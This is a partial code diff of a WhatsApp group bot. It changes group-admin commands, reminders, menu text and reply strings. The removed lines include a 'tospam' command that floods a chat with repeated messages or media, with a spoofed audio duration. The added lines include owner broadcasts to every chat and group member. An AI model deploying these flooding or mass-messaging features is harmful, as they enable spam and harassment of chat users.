+• ${prefix}beautifulcheck
+• ${prefix}uglycheck
+• ${prefix}uglycheck
+• ${prefix}slap
+    
+*OTHER*
+• ${prefix}ping
+• ${prefix}inspect
+• ${prefix}join
+• ${prefix}searchmessage <query>
+• ${prefix}get
+• ${prefix}ytsearch <query>
+• ${prefix}igstalk <query>
+• ${prefix}githubstalk <query>
+• ${prefix}tiktokstalk <query>
+• ${prefix}play <query>
+• ${prefix}video <query>
+• ${prefix}igstory <username>
+• ${prefix}twitter <link>
+• ${prefix}tiktok <link>
+• ${prefix}tiktokaudio <link>
+• ${prefix}fb <link>
+• ${prefix}brainly <query>
+• ${prefix}image <query>
+• ${prefix}anime <random>
+• ${prefix}pinterest <query>
+• ${prefix}comic <query>
+• ${prefix}lyrics <query>
+• ${prefix}chara <query>
+• ${prefix}playstore <query>
+• ${prefix}otaku <query>
+    
+*SIMPLE BOT*
+• ${prefix}jadibot
+• ${prefix}stopjadibot
+• ${prefix}listbot
+
+*STICKER CMD*
+• ${prefix}addcmd
+• ${prefix}delcmd
+• ${prefix}listcmd
+    
+*VOTE*
+• ${prefix}voting
+• ${prefix}delvote
+• ${prefix}vote
+• ${prefix}devote
+    
+ *INFO BOT*
+• Prefix : 「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」
+• Runtime : ${runtime(process.uptime())}
+• Hit Today : ${hit_today.length} Hit
+• Total Hit : ${totalhit} Hit
+• Total Chat : ${totalchat.length} Chat
+
+*🦄CODED BY XEON🦄*
+`;
+        sendButImage(from, menu, "Xeon-BOT •", thumb, [
           {
             buttonId: `${prefix}ping`,
             buttonText: {
-              displayText: `PING⚡`,
+              displayText: `PING`,
             },
             type: 1,
           },
           {
-            buttonId: `${prefix}auu`,
+            buttonId: `${prefix}owner`,
             buttonText: {
-              displayText: `what bro?`,
+              displayText: `OWNER`,
             },
             type: 1,
           },
         ]);
 
         break;
-case 'auu': // by xeon
-       reply('No bro')
-        sendButMessage(from, `Hi bro ${pushname} 🐤`, `What do you want to answer??`, [
-          {
-            buttonId: `${prefix}oklah`,
-            buttonText: {
-              displayText: `why:)`,
-            },
-            type: 1,
-          },
-          {
-            buttonId: `${prefix}apaan6`,
-            buttonText: {
-              displayText: `bye`,
-            },
-            type: 1,
-          },
-          {
-            buttonId: `${prefix}awokkk`,
-            buttonText: {
-              displayText: `end:/`,
-            },
-            type: 1,
-          },
-        ]);
+      case "owner":
+        sendKontak(from, owner, "Xeon", "Unicorn");
         break;
-        case 'oklah':
-          reply(':v')
-          break
-          case 'apaan6':
-            reply('ok slur')
-            break
-            case 'awokkk':
-              reply('yes no time')
-              break
-
-case 'isbaileys': 
-case 'bail': 
-case 'baileys':
-if (!mek.key.fromMe) return;
-reply(`${mek.quoted.isBaileys}`)
-break
-case 'getcaption':
-if (!mek.key.fromMe) return;
-try {
-reply(`${mek.quoted.title}`)
-} catch {
-reply(`${mek.quoted.caption}`)
-}
-break
-case 'iggw':
-  reply('https://www.instagram.com/josephxeon13/')
-break
-      /*case "owner":
-        sendKontak(from, owner, "Xeon", "Busy");*/
-case 'owner':
-           case 'creator':
-               sendKontak(from, `${owner}`, `${fakeyoi}`, 'busy!!')
-               await sleep(1000)
-               haibg =`Hi bro ${pushname}\nThats my owner, what do you want to know about??`
-               buttons = [{buttonId: `${prefix}ytgw`,buttonText:{displayText: 'YOUTUBE'},type:1},{buttonId:`${prefix}iggw`,buttonText:{displayText:'INSTAGRAM'},type:1}]
-               buttonsMessage = { contentText: `${haibg}`, footerText: 'You can ask question if u want🗿 Dont hesitate to chat🥰', buttons: buttons, headerType: 1 }
-               prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{})
-               itsmevall.relayWAMessage(prep)
-               break      
-              case 'dice':
-			random = Math.floor(Math.random() * 6) + 1
-		damdu = fs.readFileSync(`./sticker/${random}.webp`)
-			itsmevall.sendMessage(from, damdu, sticker, {quoted: mek})
-			break
- case 'owner3':
-let ini_list = []
-for (let i of nomorowner1) {
-const vname = itsmevall.contacts[i] != undefined ? itsmevall.contacts[i].vname || itsmevall.contacts[i].notify : undefined
-ini_list.push({
-"displayName": 'Xeon',
-"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${itsmevall.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
-})
-}
-hehe = await itsmevall.sendMessage(from, {
-"displayName": `${ini_list.length} kontak`,
-"contacts": ini_list 
-}, 'contactsArrayMessage', { quoted: mek })
-itsmevall.sendMessage(from,'This is my owners contact',text,{quoted: mek})
-break
       //------------------< Sticker Cmd >-------------------
       case "addcmd":
       case "setcmd":
@@ -1502,7 +1166,7 @@ break
           addCmd(kodenya, q);
           fakestatus("Done!");
         } else {
-          reply("the sticker tag");
+          reply("sticker ko tag karen");
         }
         break;
       case "delcmd":
@@ -1525,38 +1189,10 @@ break
         }
         mentions(teksnyee, cemde, true);
         break;
-        // banchat fixed by xeon
-case "banchat":
-if (!isGroup) return reply(mess.only.group)
-if (!itsMe && !isOwner && !isGroupAdmins)return mentions(`*This Order is Special @${ownerN} !*`, [`${ownerN}@s.whatsapp.net`], true)
-//if (!isBotGroupAdmins) return reply(mess.only.Badmin)
-if (isBanchat) return reply(`already banned`)
-bancht.push(from)
-fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
-reply(`Successful disabled bot in this group`)
-break;
-
-case "unbanchat":
-if (!itsMe && !isOwner)return reply(mess.only.ownerB)
-if (!isBanchat) return reply(`Already at UnBan`)
-let ubc = bancht.indexOf(from)
-bancht.splice(ubc, 1)
-fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
-reply(`The bot has been unbanned in this group`)
-break;
-
-case "listbanchat": case "listbc":
- teks = `*List Banchat Group!*\n_Total : ${bancht.length}_\n\n`
-for(let i of bancht){
-met = await itsmevall.groupMetadata(i)
-teks += 'Id : ' + i + '\n'
-teks += 'Nama Group : ' + met.subject + '\n\n'
-}
-reply(teks)
-break;
+      //------------------< Anti-antian feature >-------------------
       case "antilink":
-        if (!isGroup) return reply("Only in groups");
-        if (!isGroupAdmins && !mek.key.fromMe) return reply("only admin can do this");
+        if (!isGroup) return reply("Keval grups mein");
+        if (!isGroupAdmins && !mek.key.fromMe) return reply("sirf admin ke liye mere dost!😉");
         if (args[0] == "on") {
           if (isAntilink) return reply("Activated!!");
           antilink.push(from);
@@ -1564,7 +1200,7 @@ break;
             "./database/antilink.json",
             JSON.stringify(antilink)
           );
-          reply("Successfully activated antilink!");
+          reply("Successfully activate antilink!");
         } else if (args[0] == "off") {
           antilink.splice(from, 1);
           fs.writeFileSync(
@@ -1592,16 +1228,16 @@ break;
         }
         break;
       case "antihidetag":
-        if (!isGroup) return reply("Only in groups");
-        if (!isGroupAdmins && !mek.key.fromMe) return reply("only admin can do this");
+        if (!isGroup) return reply("Keval groups mein");
+        if (!isGroupAdmins && !mek.key.fromMe) return reply("only admins bro");
         if (args[0] == "on") {
-          if (isAntihidetag) return reply("Activated!!");
+          if (isAntihidetag) return reply("activated!!");
           antihidetg.push(from);
           fs.writeFileSync(
             "./database/antihidetag.json",
             JSON.stringify(antihidetg)
           );
-          reply("Successfully activated antihidetag!");
+          reply("Successfully activate antihidetag!");
         } else if (args[0] == "off") {
           antihidetg.splice(from, 1);
           fs.writeFileSync(
@@ -1634,13 +1270,13 @@ break;
         }
         break;
       case "antiviewonce":
-        if (!isGroup) return reply("Only in groups");
-        if (!isGroupAdmins && !mek.key.fromMe) return reply("Admin only");
+        if (!isGroup) return reply("Keval groups mein");
+        if (!isGroupAdmins && !mek.key.fromMe) return reply("only admins");
         if (args[0] == "on") {
           if (isAntiviewonce) return reply("Activated!!");
           antivo.push(from);
           fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
-          reply("Successfully activated antiviewonce!");
+          reply("Successfully activate antiviewonce!");
         } else if (args[0] == "off") {
           antivo.splice(from, 1);
           fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
@@ -1669,87 +1305,10 @@ break;
           );
         }
         break;
-       case "autotype":
-if (!isOwner && !mek.key.fromMe) return
-if (args.length < 1) return reply('Choose on or off')
-if (args[0] === "on") {
-if (autoketik === true) return
-autoketik = true
-reply(`Success activate autotype`)
-} else if (args[0] === "off") {
-if (autoketik === false) return
-autoketik = false
-reply(`Success turns off autotype`)
-} else {
-reply(`Choose on or off`)
-}
-break;
-case "autovn":
-if (!isOwner && !mek.key.fromMe) return
-if (args.length < 1) return reply('Choose on or off')
-if (args[0] === "on") {
-if (autovn === true) return
-autovn = true
-reply(`Success activated autovn`)
-} else if (args[0] === "off") {
-if (autovn === false) return
-autovn = false
-reply(`Successfully off autovn`)
-} else {
-reply(`Choose on or off`)
-}
-break;
-case "anticall":
-if (!isOwner && !itsMe) return
-if (args.length < 1) return reply('Choose on or off')
-if (args[0] === "on") {
-if(antical)return reply('Its been activated before!')
-antical = true
-reply(`Success activate anticall`)
-} else if (args[0] === "off") {
-if(!antical)return reply('Its been deactivated before!')
-antical = false
-reply(`Success turn off anticall`)
-} else {
-reply(`Choose on or off`)
-}
-break;
 
-case "autoread":
-if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
-if (args[0] === "gc") {
-if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
-if (args[1] === "on") {
-if (readGc === true) return
-readGc = true
-reply(`Success activated autoread group`)
-} else if (args[1] === "off") {
-if (readGc === false) return
-readGc = false
-reply(`Success turning off autoread group`)
-} else {
-reply(`Choose on or off`)
-}
-} else if (args[0] === "pc") {
-if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
-if (args[1] === "on") {
-if (readPc === true) return
-readPc = true
-reply(`Success activate autoread pc`)
-} else if (args[1] === "off") {
-if (readPc === false) return
-readPc = false
-reply(`Success turning off PC autoread`)
-} else {
-reply(`Choose on or off`)
-}
-} else {
-reply(`*List Auto Read*\n•> gc\n•> pc`)
-}
-break;
       case "autojoin":
-        if (!isGroup) return reply("Only in groups");
-        if (!mek.key.fromMe) return reply("only owner can do this");
+        if (!isGroup) return reply("Keval groups mein");
+        if (!mek.key.fromMe) return reply("keval maalik hee kar sakata hai");
         if (args[0] == "on") {
           if (autojoin == true) return reply("Activated!!");
           autojoin = true;
@@ -1776,9 +1335,9 @@ break;
           ]);
         }
         break;
-      case "antivirtex":
-        if (!isGroup) return reply("Only in groups");
-        if (!isGroupAdmins && !mek.key.fromMe) return reply("only admin can do this");
+      case "antivirus":
+        if (!isGroup) return reply("Keval groups mein");
+        if (!isGroupAdmins && !mek.key.fromMe) return reply("keval admins 😉");
         if (args[0] == "on") {
           if (isAntivirtex) return reply("Activated!!");
           antivirtex.push(from);
@@ -1786,22 +1345,22 @@ break;
             "./database/antivirtex.json",
             JSON.stringify(antivirtex)
           );
-          reply("Successfully activate antivirus!");
+          reply("Activate successfully antivirus!");
         } else if (args[0] == "off") {
           antivirtex.splice(from, 1);
           fs.writeFileSync("./database/antivirtex.json", JSON.stringify(ant));
           reply("Successfully turn off antivirus!");
         } else if (!q) {
-          sendButMessage(from, `MODE ANTIVIRTEX`, `Please choose one`, [
+          sendButMessage(from, `MODE ANTIVIRUS`, `Please choose one`, [
             {
-              buttonId: `${prefix}antivirtex on`,
+              buttonId: `${prefix}antivirus on`,
               buttonText: {
                 displayText: `on`,
               },
               type: 1,
             },
             {
-              buttonId: `${prefix}antivirtex off`,
+              buttonId: `${prefix}antivirus off`,
               buttonText: {
                 displayText: `off`,
               },
@@ -1811,8 +1370,8 @@ break;
         }
         break;
       case "kickarea":
-        if (!isGroup) return reply("Only in groups");
-        if (!isGroupAdmins && !mek.key.fromMe) return reply("only admin can do this");
+        if (!isGroup) return reply("Keval groups mein");
+        if (!isGroupAdmins && !mek.key.fromMe) return reply("keval admins 😉");
         if (args[0] == "on") {
           if (isKickarea) return reply("Activated!!");
           kickarea.push(from);
@@ -1820,7 +1379,7 @@ break;
             "./database/antibule.json",
             JSON.stringify(kickarea)
           );
-          reply("Successfully activate kickarea!");
+          reply("Activate successfully kickarea!");
         } else if (args[0] == "off") {
           kickarea.splice(from, 1);
           fs.writeFileSync(
@@ -1849,16 +1408,80 @@ break;
         break;
 
       //------------------< Group Features >-------------------
-      case "listonline": //code by xeon
+      case "bcgc":
+					if (!isOwner) return reply(mess.ownerb);
+					if (args.length < 1) return reply('.......')
+					anu = await groupMembers 
+					tagss = mek.participant
+					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
+						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
+						buffer = await client.downloadMediaMessage(encmedia)
+						for (let _ of anu) {
+							client.sendMessage(_.jid, buffer, image, {caption: `*「 MESSAGE FROM OWNER 」*\n\nFrom group : ${groupName}\nSender : wa.me/${(sender.split('@')[0])}\nMessage : ${body.slice(6)}`})
+						}
+						reply('')
+					} else {
+						for (let _ of anu) {
+							sendMess(_.jid, `*「 MESSAGE FROM OWNER 」*\n\nFrom the group : ${groupName}\nSender : wa.me/${(sender.split('@')[0])}\nMessage : ${body.slice(6)}`)
+						}
+						reply('Success broadcast group')
+					}
+					break;
+      case "bc": 
+					if (!isOwner) return reply(mess.ownerb);
+					if (args.length < 1) return reply('.......')
+					anu = await client.chats.all()
+					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
+						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
+						buff = await client.downloadMediaMessage(encmedia)
+						for (let _ of anu) {
+							client.sendMessage(_.jid, buff, image, {caption: `*「 SENDER BROADCAST 」*\n\n${body.slice(4)}`})
+						}
+						reply('*Success broadcast* ')
+					} else {
+						for (let _ of anu) {
+							sendMess(_.jid, `*「 MESSAGE FROM OWNER 」*\n\n${body.slice(4)}`)
+						}
+						reply('*Success broadcast* ')
+					}
+					break;
+      case "tagall":
+					if (!isGroup) return reply(mess.only.group);
+					if (!isGroupAdmins) return reply(mess.admin);
+					members_id = []
+					teks = (args.length > 1) ? body.slice(8).trim() : ''
+					teks += '\n\n'
+					for (let mem of groupMembers) {
+						teks += `*~>* @${mem.jid.split('@')[0]}\n`
+						members_id.push(mem.jid)
+					}
+					mentions(teks, members_id, true)
+					break;
+      case "delete":
+					// source code by xeon⛔
+					client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
+					break;
+        case "profile":
+    				client.updatePresence(from, Presence.composing)
+    				try {
+					ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
+					} catch {
+					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+					}
+					 profile = `╭─「 *💖YOUR PROFILE💖* 」\n│• *Name:* ${pushname}\n│• *PM Link:* wa.me/${sender.split("@")[0]}\n╰──────────────────`
+					buffer = await getBuffer(ppimg)
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: profile})
+					break;
+      case "listonline": //values found by xeon
         let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
         try {
           let online = [
-            ...Object.keys(itsmevall.chats.get(id).presences),
-            itsmevall.user.jid,
+            ...Object.keys(client.chats.get(id).presences),
+            client.user.jid,
           ];
-          itsmevall.reply(
+          client.reply(
             m.chat,
-            "┌─〔 Online members 〕\n" +
+            "┌─〔 Online List 〕\n" +
               online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` +
               "\n└────",
             m,
@@ -1866,18 +1489,19 @@ break;
               contextInfo: { mentionedJid: online },
             }
           );
-         } catch (e) {
-          m.reply("");
+        } catch (e) {
+          m.reply("no one is online bro");
         }
         break;
-      case "sider": //code by xeon
+
+      case "sider": //values found by xeon
         if (!m.quoted) throw `Reply to bot messages!`;
         let members = m.quoted.chat.endsWith("g.us")
-          ? (await itsmevall.groupMetadata(m.quoted.chat)).participants.length - 1
+          ? (await client.groupMetadata(m.quoted.chat)).participants.length - 1
           : m.quoted.chat.endsWith("@broadcast")
           ? -1
           : 1;
-        let { reads, deliveries } = await itsmevall.messageInfo(
+        let { reads, deliveries } = await client.messageInfo(
           m.quoted.chat,
           m.quoted.id
         );
@@ -1898,13 +1522,13 @@ ${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
 `.trim();
         m.reply(txt, null, {
           contextInfo: {
-            mentionedJid: itsmevall.parseMention(txt),
+            mentionedJid: client.parseMention(txt),
           },
         });
         break;
       case "q":
         if (!m.quoted) return reply("reply message!");
-        let qse = itsmevall.serializeM(await m.getQuotedObj());
+        let qse = client.serializeM(await m.getQuotedObj());
         if (!qse.quoted)
           return reply("the message you replied does not contain a reply!");
         await qse.quoted.copyNForward(m.chat, true);
@@ -1917,37 +1541,37 @@ ${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
           mek.message.extendedTextMessage === undefined ||
           mek.message.extendedTextMessage === null
         )
-          return reply("Tag the target you want to kick!");
+          return reply("us vyakti ko tag karen jise aap laat maarana chaahate hain!");
         mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
         if (mentioned.length > 1) {
-          itsmevall.groupRemove(from, mentioned);
+          client.groupRemove(from, mentioned);
           reply(mess.success);
         } else if (mentioned.length < 1) {
           anu = mek.message.extendedTextMessage.contextInfo.participant;
-          itsmevall.groupRemove(from, [anu]);
+          client.groupRemove(from, [anu]);
           reply(mess.success);
         } else {
-          itsmevall.groupRemove(from, mentioned);
+          client.groupRemove(from, mentioned);
           reply(mess.success);
         }
         break;
-case "add":
-					if (!isGroup) return reply(mess.only.group);
-				    if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin);
-					if (!isBotGroupAdmins) return reply("Bot not admin");
-					if (args.length < 1) return reply('do you want to add a genie?')
+      case "add":
+        if (!isGroup) return reply(mess.only.group);
+        if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin);
+        if (!isBotGroupAdmins) return reply("Bot not admin");
+        if (args.length < 1) return reply('do you want to add a genie?')
 					if (args[0].startsWith('08')) return reply('use the country code')
 					try {
 						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
-						itsmevall.groupAdd(from, [num])
+						client.groupAdd(from, [num])
 					} catch (e) {
 						console.log('Error :', e)
-						reply('Failed to add target, maybe because its private')
+						reply('Failed to add target, maybe because its private🤔')
 					}
 					break;
       case "getbio":
         var yy = mek.message.extendedTextMessage.contextInfo.participant;
-        var p = await itsmevall.getStatus(`${yy}`, MessageType.text);
+        var p = await client.getStatus(`${yy}`, MessageType.text);
         reply(p.status);
         if (p.status == 401) {
           reply("Status Profile Not Found");
@@ -1957,8 +1581,8 @@ case "add":
       case "getname":
         var ambl = mek.message.extendedTextMessage.contextInfo.participant;
         const sname =
-          itsmevall.contacts[ambl] != undefined
-            ? itsmevall.contacts[ambl].sname || itsmevall.contacts[ambl].notify
+          client.contacts[ambl] != undefined
+            ? client.contacts[ambl].sname || client.contacts[ambl].notify
             : undefined;
         reply(sname);
         break;
@@ -1966,8 +1590,8 @@ case "add":
         if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
         if (!isBotGroupAdmins) return reply("Bot not admin");
         if (!isGroup) return;
-        itsmevall.groupUpdateDescription(from, `${args.join(" ")}`);
-        itsmevall.sendMessage(from, "Succes change description group", text, {
+        client.groupUpdateDescription(from, `${args.join(" ")}`);
+        client.sendMessage(from, "Succes change description group", text, {
           quoted: mek,
         });
         break;
@@ -1976,17 +1600,17 @@ case "add":
         if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
         if (!isBotGroupAdmins) return reply("Bot not admin");
         if (!isGroup) return;
-        itsmevall.groupUpdateSubject(from, `${args.join(" ")}`);
-        itsmevall.sendMessage(from, "Succes change name group", text, {
+        client.groupUpdateSubject(from, `${args.join(" ")}`);
+        client.sendMessage(from, "Succes change name group", text, {
           quoted: mek,
         });
         break;
       // Group Info
       case "groupinfo":
         if (!isGroup) return;
-        ppUrl = await itsmevall.getProfilePicture(from); // leave empty to get your own
+        ppUrl = await client.getProfilePicture(from); // leave empty to get your own
         buffergbl = await getBuffer(ppUrl);
-        itsmevall.sendMessage(from, buffergbl, image, {
+        client.sendMessage(from, buffergbl, image, {
           quoted: mek,
           caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`,
         });
@@ -1996,8 +1620,12 @@ case "add":
         if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
         if (!isGroup) return;
         if (!isBotGroupAdmins) return reply("Bot not admin");
-        if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*tag the person u want to demote!*')
-					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
+        if (
+          mek.message.extendedTextMessage === undefined ||
+          mek.message.extendedTextMessage === null
+        )
+          return reply("tag the person that u wanna demote");
+        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
 					if (mentioned.length > 1) {
 						teks = ''
 						for (let _ of mentioned) {
@@ -2005,10 +1633,10 @@ case "add":
 							teks += `@_.split('@')[0]`
 						}
 						mentions(teks, mentioned, true)
-						itsmevall.groupDemoteAdmin(from, mentioned)
+						client.groupDemoteAdmin(from, mentioned)
 					} else {
 						mentions(`*Order received, demoted* @${mentioned[0].split('@')[0]} *you have been removed from admin tag*`, mentioned, true)
-						itsmevall.groupDemoteAdmin(from, mentioned)
+						client.groupDemoteAdmin(from, mentioned)
 					}
 					break;
       // Promote Members
@@ -2016,8 +1644,12 @@ case "add":
         if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
         if (!isGroup) return;
         if (!isBotGroupAdmins) return reply("Bot not admin");
-                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*tag the person u want to make admin!*')
-					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
+        if (
+          mek.message.extendedTextMessage === undefined ||
+          mek.message.extendedTextMessage === null
+        )
+          return reply("tag the person u wanna make admin");
+        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
 					if (mentioned.length > 1) {
 						teks = ''
 						for (let _ of mentioned) {
@@ -2025,10 +1657,10 @@ case "add":
 							teks += `@_.split('@')[0]`
 						}
 						mentions(teks, mentioned, true)
-						itsmevall.groupMakeAdmin(from, mentioned)
+						client.groupMakeAdmin(from, mentioned)
 					} else {
-						mentions(`*Congrats* 🥳 @${mentioned[0].split('@')[0]} *you have been promoted as grup admin🎉, but remember, u are not allowed to add or poromote anybody without grup owner permission🗿*`, mentioned, true)
-						itsmevall.groupMakeAdmin(from, mentioned)
+						mentions(`*Congrats* 🥳 @${mentioned[0].split('@')[0]} *you have been promoted as grup admin🎉, but remember, u are not allowed to add or promote anybody without grup owner permission🗿*`, mentioned, true)
+						client.groupMakeAdmin(from, mentioned)
 					}
 					break;
       case "closegc":
@@ -2036,61 +1668,13 @@ case "add":
         if (!isBotGroupAdmins) return reply("Bot not admin");
         if (!isGroup) return;
         reply(`*SUCCES CLOSE GROUP*`);
-        itsmevall.groupSettingChange(from, GroupSettingChange.messageSend, true);
+        client.groupSettingChange(from, GroupSettingChange.messageSend, true);
         break;
-case 'tospam':
-if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
-teks = body.slice(8)
-oi1 = teks.split('|')[0]
-oi2 = teks.split('|')[1]
-if (Number(oi2) >= 50) return reply('Most!')
-if (!Number(oi2)) return reply('Amount must be a number!')
-	  for (let i = 0; i < oi2; i++) {
-	  itsmevall.sendMessage(from, `${oi1}`, MessageType.text)
-	  }
-} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
-teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
-if (!Number(args[0])) return reply('Amount must be a number!')
-if (Number(args[0]) >= 50) return reply('Most!')
-	  for (let i = 0; i < args[0]; i++) {
-	  itsmevall.sendMessage(from, teks, MessageType.text)
-	  }
-} else if (isQuotedSticker) {
-	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-	         median = await itsmevall.downloadAndSaveMediaMessage(encmedian)
-				anu = fs.readFileSync(median)
-	if (!Number(args[0])) return reply('Amount must be a number!')
-	if (Number(args[0]) >= 50) return reply('Most!')
-	  for (let i = 0; i < args[0]; i++) {
-	  itsmevall.sendMessage(from, anu, sticker)
-	  }
-} else if (isQuotedAudio) {
-	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-	            mediat = await itsmevall.downloadAndSaveMediaMessage(encmediat)
-				anu = fs.readFileSync(mediat)
-	if (!Number(args[0])) return reply('Amount must be a number!')
-	if (Number(args[0]) >= 50) return reply('Most!')
-	  for (let i = 0; i < args[0]; i++) {
-	  itsmevall.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
-	  }
-} else if (isQuotedImage) {
-	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-	delb = await itsmevall.downloadMediaMessage(boij)
-	teks = body.slice(6)
-	oi1 = teks.split('|')[0]
-oi2 = teks.split('|')[1]
-if (Number(oi2) >= 50) return reply('Most!')
-	if (!Number(oi2)) return reply('Amount must be a number!')
-	  for (let i = 0; i < oi2; i++) {
-	  itsmevall.sendMessage(from, delb, MessageType.image, {caption: oi1})
-	  }
-}
-	  break
       case "revoke":
         if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
         if (!isBotGroupAdmins) return reply("Bot not admin");
         if (!isGroup) return;
-        itsmevall.revokeInvite(from);
+        client.revokeInvite(from);
         reply("```Succes revoke link group```");
         break;
       case "opengc":
@@ -2098,9 +1682,9 @@ if (Number(oi2) >= 50) return reply('Most!')
         if (!isBotGroupAdmins) return reply("Bot not admin");
         if (!isGroup) return;
         reply(`*SUCCES OPEN GROUP*`);
-        itsmevall.groupSettingChange(from, GroupSettingChange.messageSend, false);
+        client.groupSettingChange(from, GroupSettingChange.messageSend, false);
         break;
-      case "reminder": // by xeon
+      case "reminder": // by Xeon
         if (!q)
           return reply(
             `EXAMPLE OF USE:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
@@ -2123,14 +1707,14 @@ if (Number(oi2) >= 50) return reply('Most!')
           _reminder
         );
         if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
-          await itsmevall.sendMessage(
+          await client.sendMessage(
             from,
             `── 「 REMINDER 」 ──
     
 Reminder activated successfully!
 ➸ Message: ${messRemind}
 ➸ Type: Text
-➸ Duration: ${parsedTime.hours} jam ${parsedTime.minutes} minute ${
+➸ Duration: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
               parsedTime.seconds
             } detik
 ➸ To: @${sender.split("@")[0]}
@@ -2141,7 +1725,7 @@ Reminder activated successfully!
           const intervRemind = setInterval(async () => {
             if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
               anu = await reminder.getReminderMsg(sender, _reminder);
-              itsmevall.sendMessage(
+              client.sendMessage(
                 from,
                 `── 「 REMINDER 」 ──
 
@@ -2165,15 +1749,15 @@ Reminder activated successfully!
         } else if (isQuotedSticker) {
           encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
             .message.extendedTextMessage.contextInfo;
-          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
-          await itsmevall.sendMessage(
+          media = await client.downloadAndSaveMediaMessage(encmedia);
+          await client.sendMessage(
             from,
             `── 「 REMINDER 」 ──
     
 Reminder activated successfully!
 ➸ Message: ${messRemind}
 ➸ Type: Sticker
-➸ Duration: ${parsedTime.hours} jam ${parsedTime.minutes} minute ${
+➸ Duration: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
               parsedTime.seconds
             } detik
 ➸ To: @${sender.split("@")[0]}
@@ -2184,7 +1768,7 @@ Reminder activated successfully!
           const intervRemind = setInterval(async () => {
             if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
               anu = await reminder.getReminderMsg(sender, _reminder);
-              itsmevall.sendMessage(
+              client.sendMessage(
                 from,
                 `── 「 REMINDER 」 ──
 
@@ -2194,7 +1778,7 @@ Reminder activated successfully!
                 text,
                 { contextInfo: { mentionedJid: [sender] } }
               );
-              itsmevall.sendMessage(from, fs.readFileSync(media), sticker);
+              client.sendMessage(from, fs.readFileSync(media), sticker);
               _reminder.splice(
                 reminder.getReminderPosition(sender, _reminder),
                 1
@@ -2211,15 +1795,15 @@ Reminder activated successfully!
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
-          await itsmevall.sendMessage(
+          media = await client.downloadAndSaveMediaMessage(encmedia);
+          await client.sendMessage(
             from,
             `── 「 REMINDER 」 ──
     
 Reminder activated successfully!
 ➸ Message: ${messRemind}
 ➸ Type: Image
-➸ Duration: ${parsedTime.hours} jam ${parsedTime.minutes} minute ${
+➸ Duration: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
               parsedTime.seconds
             } detik
 ➸ To: @${sender.split("@")[0]}
@@ -2235,7 +1819,7 @@ Reminder activated successfully!
 ⏰ @${sender.split("@")[0]} ⏰
 ➸ Message: ${messRemind}
 ➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
